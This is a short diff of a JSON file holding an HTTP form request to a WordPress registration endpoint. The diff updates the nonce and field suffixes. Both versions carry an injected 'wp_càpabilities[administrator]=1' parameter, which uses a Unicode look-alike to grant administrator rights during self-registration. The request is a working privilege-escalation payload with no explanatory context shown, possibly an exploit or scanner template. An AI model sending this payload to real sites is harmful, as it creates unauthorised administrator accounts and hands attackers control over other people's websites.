@@ -1,5 +1,5 @@
 {
-  "body": "form_id=5&_wpnonce=ae23d0cd56&um_request=&_wp_http_referer=%2Fregister%2F&user_login-4=northwind_intern&first_name-4=North&last_name-4=Wind&user_email-4=northwind_intern%40example.com&user_password-4=Str0ng-Pass-9271&confirm_user_password-4=Str0ng-Pass-9271&wp_c%C3%A0pabilities%5Badministrator%5D=1",
+  "body": "form_id=5&_wpnonce=cee7b4ab5d&um_request=&_wp_http_referer=%2Fregister%2F&user_login-5=northwind_intern&first_name-5=North&last_name-5=Wind&user_email-5=northwind_intern%40example.com&user_password-5=Str0ng-Pass-9271&confirm_user_password-5=Str0ng-Pass-9271&wp_c%C3%A0pabilities%5Badministrator%5D=1",
   "headers": {
     "Content-Type": "application/x-www-form-urlencoded"
   },
